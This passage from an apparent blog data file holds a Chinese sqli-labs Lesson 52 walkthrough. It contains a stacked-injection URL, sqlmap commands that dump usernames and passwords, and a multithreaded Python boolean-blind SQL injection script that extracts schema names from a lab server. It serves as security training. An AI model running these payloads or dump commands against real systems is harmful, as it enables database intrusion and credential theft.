main()\n```\n\n\n\n## 堆叠注入\n\n`http://10.60.17.35:8082/Less-52/?sort=rand(false);create+table+less52+like+users`\n\n![008](/img/sql/Lesson-52/008.png)\n\n![009](/img/sql/Lesson-52/009.png)\n\n## SQLMAP\n\n`sqlmap -u http://10.60.17.35:8082/Less-52/?sort=1 --technique B --dbms mysql --threads 20`\n\n![010](/img/sql/Lesson-52/010.png)\n\n![011](/img/sql/Lesson-52/011.png)\n\n`sqlmap -u http://10.60.17.35:8082/Less-52/?sort=1 --technique B --dbms mysql --threads 20 -D security -T users -C username,password --dump`\n\n![012](/img/sql/Lesson-52/012.png)","slug":"sqli-labs-lession-52-GET-盲注-数字型堆叠注入-OrderBy注入","published":1,"updated":"2019-06-19T17:23:13.396Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istkv009p4dsbz0u4seff","content":"<h1 id=\"sqli-labs-lession-52-GET-盲注-数字型堆叠注入-OrderBy注入\"><a href=\"#sqli-labs-lession-52-GET-盲注-数字型堆叠注入-OrderBy注入\" class=\"headerlink\" title=\"sqli-labs lession-52 GET-盲注-数字型堆叠注入-OrderBy注入\"></a>sqli-labs lession-52 GET-盲注-数字型堆叠注入-OrderBy注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-52/001.png\" alt=\"001\"></p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><h3 id=\"判断类型\"><a href=\"#判断类型\" class=\"headerlink\" title=\"判断类型\"></a>判断类型</h3><p>数字型是受排序方式影响的</p>\n<p><img src=\"/img/sql/Lesson-52/002.png\" alt=\"002\"></p>\n<p>这里与上一课不同,没有报错。</p>\n<h3 id=\"布尔型注入利用\"><a href=\"#布尔型注入利用\" class=\"headerlink\" title=\"布尔型注入利用\"></a>布尔型注入利用</h3><p>发现rand(true)和rand(false)返回值不同,可以利用布尔盲注脚本代替手注过程。</p>\n<p><img src=\"/img/sql/Lesson-52/003.png\" alt=\"003\"></p>\n<p>拿之前的写过的布尔脚本改一改。</p>\n<p><img src=\"/img/sql/Lesson-52/004.png\" alt=\"004\"></p>\n<p><img src=\"/img/sql/Lesson-52/005.png\" alt=\"005\"></p>\n<p><img src=\"/img/sql/Lesson-52/006.png\" alt=\"006\"></p>\n<p><img src=\"/img/sql/Lesson-52/007.png\" alt=\"007\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#l52.py</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">from</span> optparse <span class=\"keyword\">import</span> OptionParser</span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">'user-agent'</span>: <span class=\"string\">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0'</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getpayload</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> url + payload</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getbasehtml</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    basehtml = requests.get(url, headers=headers).content</span><br><span class=\"line\">    <span class=\"keyword\">return</span> basehtml</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binary_search_db</span><span class=\"params\">(url, basehtml, payload)</span>:</span></span><br><span class=\"line\">    i = <span class=\"number\">1</span></span><br><span class=\"line\">    s = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        count = <span class=\"number\">0</span></span><br><span class=\"line\">        mid = <span class=\"number\">0</span></span><br><span class=\"line\">        low = <span class=\"number\">47</span></span><br><span class=\"line\">        high = <span class=\"number\">57</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt;= high:</span><br><span class=\"line\">            mid = int((low + high) / <span class=\"number\">2</span>)</span><br><span class=\"line\">            newpayload = payload % (i, mid)</span><br><span class=\"line\">            html = requests.get(getpayload(url, newpayload),</span><br><span class=\"line\">                                headers=headers).content</span><br><span class=\"line\">            <span class=\"keyword\">if</span> basehtml == html:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">                count += <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid - <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> count != <span class=\"number\">0</span>:</span><br><span class=\"line\">            s = s + chr(int((low + high + <span class=\"number\">1</span>) / <span class=\"number\">2</span>))</span><br><span class=\"line\">            i = i + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> int(s)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getdbnum</span><span class=\"params\">(url, basehtml)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))&gt;%d)\"</span></span><br><span class=\"line\">    num = binary_search_db(url, basehtml, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]数据库数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_db_len</span><span class=\"params\">(url, basehtml, num)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit i,1),%d,1))&gt;%d)\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"db\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, basehtml, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'db\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    print(lenth)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 取与法</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">and_method</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    two = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">8</span>, <span class=\"number\">16</span>, <span class=\"number\">32</span>, <span class=\"number\">64</span>, <span class=\"number\">128</span>]</span><br><span class=\"line\">    s = <span class=\"number\">0</span></span><br><span class=\"line\">    keys = []</span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    m = []</span><br><span class=\"line\">    basehtml = requests.get(</span><br><span class=\"line\">        <span class=\"string\">'http://10.60.17.35:8082/Less-52/?sort=rand(true)'</span>, headers=headers).content</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(url, i, s)</span>:</span></span><br><span class=\"line\">        html = requests.get(url, headers=headers).content</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (basehtml == html):</span><br><span class=\"line\">            s = s | two[i]</span><br><span class=\"line\">            m.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">        newpayload = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        newpayload = payload + <span class=\"string\">\"%26\"</span> + <span class=\"string\">\"%d=%d)\"</span> % (two[i], two[i])</span><br><span class=\"line\">        keys.append(newpayload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread, args=(</span><br><span class=\"line\">            getpayload(url, keys[i]), i, s,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> thread:</span><br><span class=\"line\">        t.start()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> thread:</span><br><span class=\"line\">        t.join()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> m:</span><br><span class=\"line\">        s = s | i</span><br><span class=\"line\">    <span class=\"keyword\">return</span> chr(s)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getdbname</span><span class=\"params\">(url, basehtml)</span>:</span></span><br><span class=\"line\">    num = getdbnum(url, basehtml)</span><br><span class=\"line\">    lenth = get_all_db_len(url, basehtml, num)</span><br><span class=\"line\">    dbs = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        dbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = <span class=\"string\">\"RAND(ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))\"</span> % (</span><br><span class=\"line\">                i, j)</span><br><span class=\"line\">            dbname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, dbname)</span><br><span class=\"line\">        print(dbname)</span><br><span class=\"line\">        dbs.append(dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'available databases [%s]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> db <span class=\"keyword\">in</span> dbs:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, db)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_table_num</span><span class=\"params\">(url, basehtml, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s'),\"</span> % dbname</span><br><span class=\"line\">    payload += <span class=\"string\">\"%d,1))&gt;%d)\"</span></span><br><span class=\"line\">    <span class=\"comment\"># print(payload)</span></span><br><span class=\"line\">    num = binary_search_db(url, basehtml, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]数据表数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_table_len</span><span class=\"params\">(url, basehtml, num, dbname)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' limit i,1),\"</span> % dbname</span><br><span class=\"line\">        payload += <span class=\"string\">\"%d,1))&gt;%d)\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"db\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, basehtml, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'db\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_table_name</span><span class=\"params\">(url, basehtml, dbname)</span>:</span></span><br><span class=\"line\">    num = get_table_num(url, basehtml, dbname)</span><br><span class=\"line\">    lenth = get_all_table_len(url, basehtml, num, dbname)</span><br><span class=\"line\">    tables = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        tbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = <span class=\"string\">\"RAND(ascii(substr((select table_name from information_schema.tables WHERE TABLE_SCHEMA='%s' limit\"</span> % dbname</span><br><span class=\"line\">            payload += <span class=\"string\">\" %d,1),%d,1))\"</span> % (i, j)</span><br><span class=\"line\">            tbname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, tbname)</span><br><span class=\"line\">        print(tbname)</span><br><span class=\"line\">        tables.append(tbname)</span><br><span class=\"line\">    print(<span class=\"string\">'Database: %s'</span> % dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[%d tables]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> table <span class=\"keyword\">in</span> tables:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, table)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列数</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_column_num</span><span class=\"params\">(url, basehtml, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s'),\"</span> % (</span><br><span class=\"line\">        tbname, dbname)</span><br><span class=\"line\">    payload += <span class=\"string\">\"%d,1))&gt;%d)\"</span></span><br><span class=\"line\">    num = binary_search_db(url, basehtml, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]列数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_columns_len</span><span class=\"params\">(url, basehtml, num, tbname, dbname)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s' limit i,1),\"</span> % (</span><br><span class=\"line\">            tbname, dbname)</span><br><span class=\"line\">        payload += <span class=\"string\">\"%d,1))&gt;%d)\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, 